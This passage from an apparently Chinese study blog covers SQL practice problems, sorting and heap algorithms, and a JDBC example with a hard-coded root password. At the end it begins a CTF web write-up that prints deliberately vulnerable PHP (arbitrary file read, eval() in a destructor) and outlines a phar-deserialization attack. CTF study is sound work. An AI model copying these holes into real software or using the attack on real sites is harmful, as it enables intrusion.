'2');\n```\n\n![image-20221103120439335](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221103120439335.png)\n\n### 知识点：\n\n#### NULL值判定\n\n参考：[寻找用户推荐人 - 寻找用户推荐人 - 力扣（LeetCode）](https://leetcode.cn/problems/find-customer-referee/solution/xun-zhao-yong-hu-tui-jian-ren-by-leetcode/)\n\nMySQL 使用三值逻辑 —— TRUE, FALSE 和 UNKNOWN。任何与 NULL 值进行的比较都会与第三种值UNKNOWN做比较。这个“任何值”包括 NULL 本身！这就是为什么 MySQL 提供 IS NULL 和 IS NOT NULL 两种操作来对 NULL 特殊判断。\n\n### 代码：\n\n```mysql\nSELECT name FROM customer WHERE referee_id != 2 OR referee_id IS NULL;\n```\n\n\n\n## 市场分析I\n\n创建语句：\n\n```sql\nCreate table If Not Exists Users (user_id int, join_date date, favorite_brand varchar(10));\nCreate table If Not Exists Orders (order_id int, order_date date, item_id int, buyer_id int, seller_id int);\nCreate table If Not Exists Items (item_id int, item_brand varchar(10))\nTruncate table Users;\ninsert into Users (user_id, join_date, favorite_brand) values ('1', '2018-01-01', 'Lenovo');\ninsert into Users (user_id, join_date, favorite_brand) values ('2', '2018-02-09', 'Samsung');\ninsert into Users (user_id, join_date, favorite_brand) values ('3', '2018-01-19', 'LG');\ninsert into Users (user_id, join_date, favorite_brand) values ('4', '2018-05-21', 'HP');\nTruncate table Orders;\ninsert into Orders (order_id, order_date, item_id, buyer_id, seller_id) values ('1', '2019-08-01', '4', '1', '2');\ninsert into Orders (order_id, order_date, item_id, buyer_id, seller_id) values ('2', '2018-08-02', '2', '1', '3');\ninsert into Orders (order_id, order_date, item_id, buyer_id, seller_id) values ('3', '2019-08-03', '3', '2', '3');\ninsert into Orders (order_id, order_date, item_id, buyer_id, seller_id) values ('4', '2018-08-04', '1', '4', '2');\ninsert into Orders (order_id, order_date, item_id, buyer_id, seller_id) values ('5', '2018-08-04', '1', '3', '4');\ninsert into Orders (order_id, order_date, item_id, buyer_id, seller_id) values ('6', '2019-08-05', '2', '2', '4');\nTruncate table Items;\ninsert into Items (item_id, item_brand) values ('1', 'Samsung');\ninsert into Items (item_id, item_brand) values ('2', 'Lenovo');\ninsert into Items (item_id, item_brand) values ('3', 'LG');\ninsert into Items (item_id, item_brand) values ('4', 'HP');\n```\n\n![image-20221103161138352](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221103161138352.png)\n\n### 知识点：\n\n#### left join：\n\n以左表为基础，从右表中选择对应条件的数据添加。\n\n```\ntable1 left join table2\n```\n\n这里即以`table1`为基础，从`table2`中选择对应条件数据\n\n#### ifnull(x1,x2)函数：\n\n如果 `x1` 为 `NULL`， 返回 `x2`，否则返回 `x1`。\n\n### 代码：\n\n```mysql\nSELECT \n\tusers.user_id AS buyer_id,\n\tusers.join_date,\n\tIFNULL(userBy.cnt,0) AS orders_in_2019\nFROM users\nLEFT JOIN(\nSELECT \n\tbuyer_id,\n\tCOUNT(buyer_id) AS cnt\nFROM orders\nWHERE orders.`order_date` BETWEEN '2019-01-01' AND '2019-12-31'\nGROUP BY buyer_id\n)userBy\nON users.user_id = userBy.buyer_id\n```\n\n## 查询近30天活跃用户数\n\n创建语句：\n\n```sql\nCreate table If Not Exists Activity (user_id int, session_id int, activity_date date, activity_type ENUM('open_session', 'end_session', 'scroll_down', 'send_message'));\nTruncate table Activity;\ninsert into Activity (user_id, session_id, activity_date, activity_type) values ('1', '1', '2019-07-20', 'open_session');\ninsert into Activity (user_id, session_id, activity_date, activity_type) values ('1', '1', '2019-07-20', 'scroll_down');\ninsert into Activity (user_id, session_id, activity_date, activity_type) values ('1', '1', '2019-07-20', 'end_session');\ninsert into Activity (user_id, session_id, activity_date, activity_type) values ('2', '4', '2019-07-20', 'open_session');\ninsert into Activity (user_id, session_id, activity_date, activity_type) values ('2', '4', '2019-07-21', 'send_message');\ninsert into Activity (user_id, session_id, activity_date, activity_type) values ('2', '4', '2019-07-21', 'end_session');\ninsert into Activity (user_id, session_id, activity_date, activity_type) values ('3', '2', '2019-07-21', 'open_session');\ninsert into Activity (user_id, session_id, activity_date, activity_type) values ('3', '2', '2019-07-21', 'send_message');\ninsert into Activity (user_id, session_id, activity_date, activity_type) values ('3', '2', '2019-07-21', 'end_session');\ninsert into Activity (user_id, session_id, activity_date, activity_type) values ('4', '3', '2019-06-25', 'open_session');\ninsert into Activity (user_id, session_id, activity_date, activity_type) values ('4', '3', '2019-06-25', 'end_session');\n```\n\n![image-20221103161349643](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221103161349643.png)\n\n### 知识点：\n\n#### DISTINCT：\n\n去重，直接当作函数用即可\n\n### 代码：\n\n```sql\nSELECT \n\tActivity.`activity_date` AS `day`,\n\tCOUNT(DISTINCT(Activity.`user_id`)) AS active_users\nFROM Activity\nWHERE Activity.`activity_date` BETWEEN '2019-06-28' AND '2019-07-27'\nGROUP BY Activity.`activity_date`\n```\n\n\n\n## 树节点\n\n创建语句：\n\n```\nCREATE TABLE IF NOT EXISTS Tree (id INT, p_id INT);\nTRUNCATE TABLE Tree;\nINSERT INTO Tree (id, p_id) VALUES ('1', 'None');\nINSERT INTO Tree (id, p_id) VALUES ('2', '1');\nINSERT INTO Tree (id, p_id) VALUES ('3', '1');\nINSERT INTO Tree (id, p_id) VALUES ('4', '2');\nINSERT INTO Tree (id, p_id) VALUES ('5', '2');\n```\n\n![image-20221103172919993](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221103172919993.png)\n\n### 知识点：\n\n#### `union`联合查询：\n\n将多个查询语句联合起来\n\n这里首先分类为根节点、叶子节点、内部节点\n\n- 根节点：\n\n  是父节点为`NULL`的\n\n  ```sql\n  SELECT\n  \tid,\n  \t'root' AS TYPE\n  FROM tree\n  WHERE p_id IS NULL\n  ```\n\n- 内部节点\n\n  父节点和子节点都不是`NULL`，其中子节点不是`NULL`可以通过判断其他节点的父节点是不是该节点来确定。\n\n  ```sql\n  SELECT id,'Inner' AS TYPE\n  FROM tree\n  WHERE id IN\n  \t(SELECT p_id\n  \tFROM tree\n  \tWHERE p_id IS NOT NULL)\n  \tAND p_id IS NOT NULL\n  ```\n\n- 叶子节点\n\n  和内部节点类似，子节点为`NULL`，存在父节点\n\n  ```sql\n  SELECT id,'Leaf' AS TYPE\n  FROM tree\n  WHERE id NOT IN\n  \t(SELECT p_id\n  \tFROM tree\n  \tWHERE p_id IS NOT NULL)\n  \tAND p_id IS NOT NULL\n  ```\n\n然后将三个表联合起来，排个序即可\n\n```sql\nSELECT\n\tid,\n\t'Root' AS TYPE\nFROM tree\nWHERE p_id IS NULL\n\nUNION\n\nSELECT id,'Inner' AS TYPE\nFROM tree\nWHERE id IN\n\t(SELECT p_id\n\tFROM tree\n\tWHERE p_id IS NOT NULL)\n\tAND p_id IS NOT NULL\n\t\nUNION\n\nSELECT id,'Leaf' AS TYPE\nFROM tree\nWHERE id NOT IN\n\t(SELECT p_id\n\tFROM tree\n\tWHERE p_id IS NOT NULL)\n\tAND p_id IS NOT NULL\nORDER BY id;\n```\n\n`CASE语句`查询：\n\n形式为`case-when-then-else-end`\n\n```sql\nSELECT \n\tid,\n\tCASE\n\t    WHEN p_id IS NULL THEN 'Root'           #root\n\t    WHEN id IN(SELECT p_id\n\t\t\tFROM tree\n\t\t\tWHERE p_id IS NOT NULL)\n\t\t    THEN 'Inner'                        #inner\n\t    ELSE 'Leaf'                             #leaf\n    END AS TYPE\nFROM tree\nORDER BY id;\n```\n\n## 合作过至少三次的演员和导演\n\n```sql\nCreate table If Not Exists ActorDirector (actor_id int, director_id int, timestamp int);\nTruncate table ActorDirector;\ninsert into ActorDirector (actor_id, director_id, timestamp) values ('1', '1', '0');\ninsert into ActorDirector (actor_id, director_id, timestamp) values ('1', '1', '1');\ninsert into ActorDirector (actor_id, director_id, timestamp) values ('1', '1', '2');\ninsert into ActorDirector (actor_id, director_id, timestamp) values ('1', '2', '3');\ninsert into ActorDirector (actor_id, director_id, timestamp) values ('1', '2', '4');\ninsert into ActorDirector (actor_id, director_id, timestamp) values ('2', '1', '5');\ninsert into ActorDirector (actor_id, director_id, timestamp) values ('2', '1', '6');\n```\n\n![image-20221103211036661](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221103211036661.png)\n\n主要是`having`的知识点\n\n参考：[mysql having和where的区别 - caibaotimes - 博客园 (cnblogs.com)](https://www.cnblogs.com/caibaotimes/p/13722165.html)\n\n**where：**\n\n- 是作用在查询结果进行分组之前，过滤掉不符合条件的数据。\n- where中不能包含聚合函数。（注意是：where后面子句不能有聚合函数，而在含有where中可以使用聚合函数）\n- 作用在group by和having字句前\n- 是作用于对表与视图\n\n**having：**\n\n- 是作用在查询结果分组之后，筛选满足条件的组，过滤掉数据。\n- 通常跟聚合函数一起使用。\n- having子句在聚合后对组记录进行筛选。\n- 是作用于分组\n\n其实就是`group by`的时候用到`having`来进行分组后的条件筛选，而不能用`where`，`where`是分组之前使用\n\n```sql\nSELECT actor_id,director_id\nFROM ActorDirector\nGROUP BY ActorDirector.actor_id,ActorDirector.director_id\nHAVING COUNT(ActorDirector.director_id)>= 3\n```\n\n或者先计数然制表，然后再查询也行\n\n```sql\nSELECT actor_id,director_id \nFROM(\n\tSELECT actor_id,director_id,COUNT(director_id) AS cnt\n\tFROM ActorDirector\n\tGROUP BY ActorDirector.actor_id,ActorDirector.director_id\n) cntTable\nWHERE cntTable.cnt >= 3 \n```\n\n\n\n## 游戏玩法分析 IV\n\n创建语句\n\n```sql\nCreate table If Not Exists Activity (player_id int, device_id int, event_date date, games_played int);\nTruncate table Activity;\ninsert into Activity (player_id, device_id, event_date, games_played) values ('1', '2', '2016-03-01', '5');\ninsert into Activity (player_id, device_id, event_date, games_played) values ('1', '2', '2016-03-02', '6');\ninsert into Activity (player_id, device_id, event_date, games_played) values ('2', '3', '2017-06-25', '1');\ninsert into Activity (player_id, device_id, event_date, games_played) values ('3', '1', '2016-03-02', '0');\ninsert into Activity (player_id, device_id, event_date, games_played) values ('3', '4', '2018-07-03', '5');\n```\n\n![image-20221104105326813](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221104105326813.png)\n\n### 知识点：\n\n#### `Date`数据类型及函数：\n\n`mysql`支持`date`日期数据类型以及为其创建了一个`DATE`函数，用法如下\n\n- 正常情况查询\n\n  ![image-20221104105904188](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221104105904188.png)\n\n- 进行日期加减查询\n\n  ![image-20221104105921938](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221104105921938.png)\n\n- 加入`DATE`函数\n\n  ![image-20221104105954814](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221104105954814.png)\n\n#### 保留小数CONVERT：\n\n可以使用`CONVERT`或者`TRUNCATE`来对除法进行保留小数\n\n- `CONVERT(a/b,DECIMAL(10,2))`\n\n  代表`a/b`以10精度计算，保留2位小数，这个精度也算是小数点后几位，存在四舍五入\n\n- `TRUNCATE(a/b,2)`\n\n  代表`a/b`保留2位小数，但是没有四舍五入\n\n### 解析：\n\n- 首先确定所有人首次登录的第二天\n\n  ```sql\n  SELECT player_id, DATE(MIN(event_date) + 1) event_date\n  \tFROM activity\n  \tGROUP BY player_id\n  ```\n\n- 然后判断第二天是否在`activity`表格中，并且计数，这个即代表在首次登录的第二天的所有人总和。\n\n  ```sql\n  SELECT COUNT(*) AS cnt\n  FROM activity \n  WHERE (player_id, event_date) IN\n  \t(SELECT player_id, DATE(MIN(event_date) + 1) event_date\n  \tFROM activity\n  \tGROUP BY player_id)\n  ```\n\n- 之后再将所有人计算总和，然后计算除法即可\n\n  ```sql\n  SELECT CONVERT(top.cnt/down.cnt,DECIMAL(10,2)) fraction \n  FROM \n  (SELECT COUNT(*) AS cnt\n  FROM activity \n  WHERE (player_id, event_date) IN\n  \t(SELECT player_id, DATE(MIN(event_date) + 1) event_date\n  \tFROM activity\n  \tGROUP BY player_id)) top,\n  \n  (SELECT COUNT(*) AS cnt\n  FROM (SELECT player_id\n  \tFROM activity\n  \tGROUP BY player_id) player_cnt) down\n  ```\n\n## 销售分析III\n\n创建语句：\n\n```sql\nCreate table If Not Exists Product (product_id int, product_name varchar(10), unit_price int);\nCreate table If Not Exists Sales (seller_id int, product_id int, buyer_id int, sale_date date, quantity int, price int);\nTruncate table Product;\ninsert into Product (product_id, product_name, unit_price) values ('1', 'S8', '1000');\ninsert into Product (product_id, product_name, unit_price) values ('2', 'G4', '800');\ninsert into Product (product_id, product_name, unit_price) values ('3', 'iPhone', '1400');\nTruncate table Sales;\ninsert into Sales (seller_id, product_id, buyer_id, sale_date, quantity, price) values ('1', '1', '1', '2019-01-21', '2', '2000');\ninsert into Sales (seller_id, product_id, buyer_id, sale_date, quantity, price) values ('1', '2', '2', '2019-02-17', '1', '800');\ninsert into Sales (seller_id, product_id, buyer_id, sale_date, quantity, price) values ('2', '2', '3', '2019-06-02', '1', '800');\ninsert into Sales (seller_id, product_id, buyer_id, sale_date, quantity, price) values ('3', '3', '4', '2019-05-13', '2', '2800');\n```\n\n![image-20221104163658566](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221104163658566.png)\n\n依次获得相关子表\n\n- 在春季销售的所有产品\n\n  ```sql\n  SELECT product_id\n  FROM Sales\n  WHERE sale_date BETWEEN '2019-01-01' AND '2019-03-31'\n  ```\n\n- 不在春季销售的所有产品\n\n  ```sql\n  SELECT product_id\n  FROM Sales\n  WHERE sale_date NOT BETWEEN '2019-01-01' AND '2019-03-31'\n  ```\n\n- 确保在春季销售的产品中没有不在春季销售的所有产品\n\n  ```sql\n  SELECT DISTINCT testOne.product_id\n  \tFROM\n  \t(SELECT product_id\n  \t\tFROM Sales\n  \t\tWHERE sale_date BETWEEN '2019-01-01' AND '2019-03-31') testOne\n  \tWHERE testOne.product_id NOT IN \n  \t(SELECT product_id\n  \t\tFROM Sales\n  \t\tWHERE sale_date NOT BETWEEN '2019-01-01' AND '2019-03-31')\n  ```\n\n- 然后依据`product_id`查询在`Product`表中查询\n\n  ```sql\n  SELECT idTable.product_id,product.product_name\n  FROM \n  (SELECT DISTINCT testOne.product_id\n  \tFROM\n  \t(SELECT product_id\n  \t\tFROM Sales\n  \t\tWHERE sale_date BETWEEN '2019-01-01' AND '2019-03-31') testOne\n  \tWHERE testOne.product_id NOT IN \n  \t(SELECT product_id\n  \t\tFROM Sales\n  \t\tWHERE sale_date NOT BETWEEN '2019-01-01' AND '2019-03-31'))idTable,\n  Product\n  WHERE idTable.product_id = product.`product_id`\n  ```\n\n  \n\n\n\n\n\n## JAVA连接\n\n```java\nimport java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.Statement;\n\npublic class test {\n\n    public static final String URL = \"jdbc:mysql://localhost:3306\";\n    public static final String USER = \"root\";\n    public static final String PASSWORD = \"123456\";\n\n    public static void main(String[] args) throws Exception {\n        //1.加载驱动程序\n        Class.forName(\"com.mysql.jdbc.Driver\");\n        //2. 获得数据库连接\n        Connection conn = DriverManager.getConnection(URL, USER, PASSWORD);\n        //3.操作数据库，实现增删改查\n        Statement stmt = conn.createStatement();\n        stmt.executeQuery(\"use mytest\");\n        ResultSet rs = stmt.executeQuery(\"SELECT sName, sAge FROM Student\");\n        //如果有数据，rs.next()返回true\n        while(rs.next()){\n            System.out.println(\"Name:\" + rs.getString(\"sName\")+\" Age:\"+rs.getInt(\"sAge\"));\n        }\n    }\n}\n```\n\n加载驱动程序需要进行下载相关`jar`包，然后导入，\n\n![image-20221028160118066](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221028160118066.png)\n\n![image-20221028160210079](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221028160210079.png)\n\n参考\n\n[Java MySQL 连接 | 菜鸟教程 (runoob.com)](https://www.runoob.com/java/java-mysql-connect.html)\n\n[(47条消息) 【IDEA】向IntelliJ IDEA创建的项目导入Jar包的两种方式_谙忆的博客-CSDN博客_idea如何添加jar包](https://blog.csdn.net/qq_26525215/article/details/53239123)\n\n其中`rs.next()`相当于跳过表头，逐行打印则需要循环`rs.next()`，结果为\n\n![image-20221028155818686](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221028155818686.png)\n\n对应表中数据\n\n![image-20221028155853564](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221028155853564.png)\n\n\n\n\n\n\n\n# 基础排序\n\n## 归并排序\n\n主要是分治思想，从大往下分，然后再合并\n\n```python\nfrom typing import List\n\nclass Solution:\n    def merge(self, nums, mid, l, r):\n        # 归并两个有序数组\n        tmp = []\n        i,j = l,mid+1\n        while (i <= mid or j <= r):\n            if (nums[i] <= nums[j]):\n                tmp.append(nums[i])\n                i += 1\n                if (i == mid + 1):\n                    tmp += nums[j:r + 1]\n                    break\n            else:\n                tmp.append(nums[j])\n                j += 1\n                if (j == r + 1):\n                    tmp += nums[i:mid + 1]\n                    break\n        nums[l:r + 1] = tmp\n\n    def mergeSort(self, nums, l, r):\n        if (l >= r):\n            return\n        #先划分\n        mid = int((l + r) / 2)\n        self.mergeSort(nums, l, mid)\n        self.mergeSort(nums, mid + 1, r)\n        \n        #再治\n        self.merge(nums, mid, l, r)\n\n\n    def sortArray(self, nums: List[int]) -> List[int]:\n        self.mergeSort(nums, 0, len(nums) - 1)\n        return nums\n```\n\n\n\n## 快速排序\n\n也是分治思想，双指针，参考[『 3种排序一网打尽 』 快速排序、归并排序、堆排序详解 - 排序数组 - 力扣（LeetCode）](https://leetcode.cn/problems/sort-an-array/solution/duo-chong-pai-xu-yi-wang-da-jin-kuai-pai-wgz4/)\n\n![1652980493-wDmBKe-quick_sort](https://pig-007.oss-cn-beijing.aliyuncs.com/img/1652980493-wDmBKe-quick_sort.png)\n\n```python\nclass Solution:\n    def partition(self, nums, low, high):\n        pivot_idx = random.randint(low,high)\n        pivot = nums[pivot_idx]\n        nums[low],nums[pivot_idx] = nums[pivot_idx],nums[low]\n        left = low\n        right = high\n        while left < right:\n            while(left < right and nums[right] >= pivot):\n                right -= 1\n            nums[left] = nums[right]\n            while(left < right and nums[left] <= pivot):\n                left += 1\n            nums[right] = nums[left]\n        nums[left] = pivot\n        return left\n\n    def quickSort(self, nums,low,high):\n        if(low >= high):\n            return\n        #先划分\n        mid = self.partition(nums,low,high)\n        \n        #再治\n        self.quickSort(nums,low,mid-1)\n        self.quickSort(nums,mid+1,high)\n\n    def sortArray(self, nums: List[int]) -> List[int]:\n        self.quickSort(nums, 0, len(nums) - 1)\n        return nums\n```\n\n\n\n# 树\n\n## 遍历\n\n以下图为例子\n\n![image-20221017141835811](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221017141835811.png)\n\n- 先序遍历：首先访问根节点，然后访问左子树，最后访问右子树。\n\n  顺序为：0-1-3-4-2-5-6\n\n  ```java\n  public void beforeTraverse(Node root) {\n      if(root == null)\n          return;\n      System.out.println(root.val);\n      beforeTraverse(root.left);\n      beforeTraverse(root.right);\n  }\n  ```\n\n- 中序遍历：首先访问左子树，然后访问根结点，最后访问右子树。\n\n  顺序为：3-1-4-0-5-2-6\n\n  ```java\n  public void beforeTraverse(Node root) {\n      if(root == null)\n          return;\n      beforeTraverse(root.left);\n      System.out.println(root.val);\n      beforeTraverse(root.right);\n  }\n  ```\n\n- 后序遍历：首先访问左子树，然后访问右子树，最后访问根结点。\n\n  顺序为：3-4-1-5-6-2-0\n\n  ```java\n  public void beforeTraverse(Node root) {\n      if(root == null)\n          return;\n      beforeTraverse(root.left);\n      beforeTraverse(root.right);\n      System.out.println(root.val);\n  }\n  ```\n\n\n\n\n\n## 二叉搜索树\n\n二叉查找树、二叉排序树\n\n若它的左子树不空，则左子树上所有结点的值均小于它的值； 若它的右子树不空，则右子树上所有结点的值均大于它的根结点的值； 它的左、右子树也分别为二叉搜索树\n\n以下图为例子\n\n![image-20221017142607148](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221017142607148.png)\n\n那么二叉搜索树的中序遍历即为递增序列：0-1-2-3-4-5-6\n\n# 堆\n\n堆是一颗完全二叉树\n\n要求排序时间算法复杂度为`O(nlogn)`常用堆排序\n\n## 建堆\n\n都是从`idx`最大的非叶子结点的子树开始，将不满足大(小)顶堆的子树递归进行下沉操作\n\n### 大顶堆\n\n```c\nvoid maxShiftDown(int* array, int rootIdx, int heapSize){\n    int leftIdx = rootIdx * 2 + 1;\n    int rightIdx = rootIdx * 2 + 2;\n    int maxIdx = rootIdx;\n    if( leftIdx < heapSize && array[leftIdx] > array[maxIdx]){\n        maxIdx = leftIdx;\n    }\n    if( rightIdx < heapSize && array[rightIdx] > array[maxIdx]){\n        maxIdx = rightIdx;\n    }\n    if( maxIdx != rootIdx){\n        int tmp = array[rootIdx];\n        array[rootIdx] = array[maxIdx];\n        array[maxIdx] = tmp;\n        maxShiftDown(array, maxIdx, heapSize);\n    }\n}\n\n\nvoid buildMaxHeap(int* array,int heapSize){\n    for(int i = heapSize/2 ; i >= 0; i--){\n        maxShiftDown(array, i, heapSize);\n    }\n}\n\n\nint main() {\n    int nums[27] = {3,2,3,1,2,4,5,5,6,7,7,8,2,3,1,1,1,10,11,5,6,2,4,7,8,5,6};\n    buildMaxHeap(nums,27);\n    return 0;\n}\n```\n\n### 小顶堆\n\n```c\nvoid minShiftDown(int* array, int rootIdx, int heapSize){\n    int leftIdx = rootIdx * 2 + 1;\n    int rightIdx = rootIdx * 2 + 2;\n    int minIdx = rootIdx;\n    if( leftIdx < heapSize && array[leftIdx] < array[minIdx]){\n        minIdx = leftIdx;\n    }\n    if( rightIdx < heapSize && array[rightIdx] < array[minIdx]){\n        minIdx = rightIdx;\n    }\n    if(minIdx != rootIdx){\n        int tmp = array[rootIdx];\n        array[rootIdx] = array[minIdx];\n        array[minIdx] = tmp;\n        minShiftDown(array, minIdx, heapSize);\n    }\n}\n\n\nvoid buildMinHeap(int* array,int heapSize){\n    for(int i = heapSize/2 ; i >= 0; i--){\n        minShiftDown(array, i, heapSize);\n    }\n}\n\n\nint main() {\n    int nums[27] = {3,2,3,1,2,4,5,5,6,7,7,8,2,3,1,1,1,10,11,5,6,2,4,7,8,5,6};\n    buildMinHeap(nums,27);\n    return 0;\n}\n```\n\n合起来加个`flag`即可决定大顶堆还是小顶堆了\n\n```c\nvoid shiftDown(int* array, int rootIdx, int heapSize, int flag){\n    int leftIdx = rootIdx * 2 + 1;\n    int rightIdx = rootIdx * 2 + 2;\n    int chooseIdx = rootIdx;\n    if(flag == 0){      //小顶堆\n        if( leftIdx < heapSize && array[leftIdx] < array[chooseIdx]){\n            chooseIdx = leftIdx;\n        }\n        if( rightIdx < heapSize && array[rightIdx] < array[chooseIdx]){\n            chooseIdx = rightIdx;\n        }\n    } else{ //大顶堆\n        if( leftIdx < heapSize && array[leftIdx] > array[chooseIdx]){\n            chooseIdx = leftIdx;\n        }\n        if( rightIdx < heapSize && array[rightIdx] > array[chooseIdx]){\n            chooseIdx = rightIdx;\n        }\n    }\n\n    if(chooseIdx != rootIdx){\n        int tmp = array[rootIdx];\n        array[rootIdx] = array[chooseIdx];\n        array[chooseIdx] = tmp;\n        shiftDown(array, chooseIdx, heapSize, flag);\n    }\n}\n\nvoid buildHeap(int* array,int heapSize,int flag){\n    for(int i = heapSize/2 ; i >= 0; i--){\n        shiftDown(array, i, heapSize,flag);\n    }\n}\n\nint main() {\n\n    int nums[27] = {3,2,3,1,2,4,5,5,6,7,7,8,2,3,1,1,1,10,11,5,6,2,4,7,8,5,6};\n    int heapSize = 27;\n    buildHeap(nums,heapSize,0);\n    return 0;\n}\n```\n\n\n\n## 删除\n\n一般只能删除堆顶元素\n\n从删除堆顶元素，将堆尾部元素放到堆顶，然后下沉该元素\n\n```c\nvoid shiftDown(int* array, int rootIdx, int heapSize, int flag){\n    int leftIdx = rootIdx * 2 + 1;\n    int rightIdx = rootIdx * 2 + 2;\n    int chooseIdx = rootIdx;\n    if(flag == 0){      //小顶堆\n        if( leftIdx < heapSize && array[leftIdx] < array[chooseIdx]){\n            chooseIdx = leftIdx;\n        }\n        if( rightIdx < heapSize && array[rightIdx] < array[chooseIdx]){\n            chooseIdx = rightIdx;\n        }\n    } else{ //大顶堆\n        if( leftIdx < heapSize && array[leftIdx] > array[chooseIdx]){\n            chooseIdx = leftIdx;\n        }\n        if( rightIdx < heapSize && array[rightIdx] > array[chooseIdx]){\n            chooseIdx = rightIdx;\n        }\n    }\n\n    if(chooseIdx != rootIdx){\n        int tmp = array[rootIdx];\n        array[rootIdx] = array[chooseIdx];\n        array[chooseIdx] = tmp;\n        shiftDown(array, chooseIdx, heapSize, flag);\n    }\n}\nint main() {\n\n    int nums[27] = {3,2,3,1,2,4,5,5,6,7,7,8,2,3,1,1,1,10,11,5,6,2,4,7,8,5,6};\n    int heapSize = 27;\n    buildHeap(nums,heapSize,0);\n    //heapSort(nums,heapSize,0);\n\n    //删除堆顶元素,然后下沉\n    nums[0] = nums[heapSize-1];\n    heapSize -= 1;\n    shiftDown(nums,0,heapSize,0);\n    return 0;\n}\n```\n\n## 插入\n\n总是在堆尾部插入元素，然后对该元素执行上浮操作\n\n```c\nvoid shiftUp(int* array, int insertIdx,int flag){\n    int parentIdx = 0;\n    if(insertIdx == 0){\n        return;\n    }\n    if(insertIdx % 2 == 0 ){\n        parentIdx = (insertIdx - 2) / 2;\n    } else{\n        parentIdx = (insertIdx - 1) / 2;\n    }\n    if(flag == 0){//小顶堆\n        if(array[parentIdx] > array[insertIdx]){\n            int tmp = array[insertIdx];\n            array[insertIdx] = array[parentIdx];\n            array[parentIdx] = tmp;\n            shiftUp(array,parentIdx,flag);\n        }\n    } else{//大顶堆\n        if(array[parentIdx] < array[insertIdx]){\n            int tmp = array[insertIdx];\n            array[insertIdx] = array[parentIdx];\n            array[parentIdx] = tmp;\n            shiftUp(array,parentIdx,flag);\n        }\n    }\n}\n\nint main() {\n    int nums[27] = {3,2,3,1,2,4,5,5,6,7,7,8,2,3,1,1,1,10,11,5,6,2,4,7,8,5,6};\n    int heapSize = 27;\n    buildMinHeap(nums,heapSize);\n\n    //删除堆顶元素,然后下沉\n    nums[0] = nums[heapSize-1];\n    heapSize -= 1;\n    minShiftDown(nums,0,heapSize);\n\n    //插入0元素到堆尾,然后上浮\n    nums[heapSize] = 0;\n    shiftUp(nums,heapSize,1);\n\n    return 0;\n}\n```\n\n## 排序\n\n依次取堆顶元素，然后执行下沉操作使得堆依旧满足大(顶)堆，即可自行决定升序还是降序\n\n```c\nvoid heapSort(int* array, int heapSize,int flag) {\n    for (int i = heapSize - 1; i >= 1; --i) {\n        int tmp = array[i];\n        array[i] = array[0];\n        array[0] = tmp;\n        heapSize -= 1;\n        shiftDown(array, 0, heapSize,flag);\n    }\n}\n```\n\n\n\n[在线演示BST网址：https://www.cs.usfca.edu/~galles/visualization/BST.html](https://www.cs.usfca.edu/~galles/visualization/BST.html)\n\n\n\n# 输入输出练习\n\n主要是`python`\n\n## A+B\n\n![image-20221012121808388](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221012121808388.png)\n\n```python\nimport sys\nwhile True:\n    line = sys.stdin.readline()\n    if line == '':\n        break\n    line = line.split(\" \")\n    print(int(line[0])+int(line[1].replace(\"\\n\",\"\")))\n```\n\n\n\n\n\n# 总结\n\n","tags":["算法"],"categories":["算法LE"]},{"title":"WEB比赛题","url":"/2022/08/19/Web比赛题/","content":"\n\n\n\n# NSSCTF2022\n\n## 一、1zweb(revenge)\n\n之前的非预期被打烂了，重新出的题\n\n### 1.漏洞分析\n\n![image-20220804150413552](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220804150413552.png)\n\n应该是任意文件读和文件上传过滤啥的。\n\n首先依据任意文件读，拿下源码`index.php`和`upload.php`\n\n#### index.php\n\n```php\n<?php\n    class LoveNss{\n    public $ljt;\n    public $dky;\n    public $cmd;\n    public function __construct(){\n        $this->ljt=\"ljt\";\n        $this->dky=\"dky\";\n        phpinfo();\n    }\n    public function __destruct(){\n        if($this->ljt===\"Misc\"&&$this->dky===\"Re\")\n            eval($this->cmd);\n    }\n    public function __wakeup(){\n        $this->ljt=\"Re\";\n        $this->dky=\"Misc\";\n    }\n}\n$file=$_POST['file'];\nif(isset($_POST['file'])){\n    if (preg_match(\"/flag/\", $file)) {\n        die(\"nonono\");\n    }\n    echo file_get_contents($file);\n}\n?>\n```\n\n给了一个类，猜测可能是`php`反序列化，同时还有`cmd`，那么就肯定是`php`反序列化了，同时使用的是`file_get_contents`函数，并且没有进行协议过滤，但是远程文件包含不太行\n\n![image-20220804151519730](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220804151519730.png)\n\n那么考虑上传`phar`文件使用`phar`协议进行反序列化，`phar`协议读取文件正常的`phar`文件时会自动依据`.metadata.bin`中数据进行反序列化。\n\n#### upload.php\n\n```php\n<?php\nif ($_FILES[\"file\"][\"error\"] > 0){\n    echo \"上传异常\";\n}\nelse{\n    $allowedExts = array(\"gif\", \"jpeg\", \"jpg\", \"png\");\n    $temp = explode(\".\", $_FILES[\"file\"][\"name\"]);\n    $extension = end($temp);\n    if (($_FILES[\"file\"][\"size\"] && in_array($extension, $allowedExts))){\n        $content=file_get_contents($_FILES[\"file\"][\"tmp_name\"]);\n        $pos = strpos($content, \"__HALT_COMPILER();\");\n        if(gettype($pos)===\"integer\"){\n            echo \"ltj一眼就发现了phar\";\n        }else{\n            if (file_exists(\"./upload/\" . $_FILES[\"file\"][\"name\"])){\n                echo $_FILES[\"file\"][\"name\"] . \" 文件已经存在\";\n            }else{\n                $myfile = fopen(\"./upload/\".$_FILES[\"file\"][\"name\"], \"w\");\n                fwrite($myfile, $content);\n                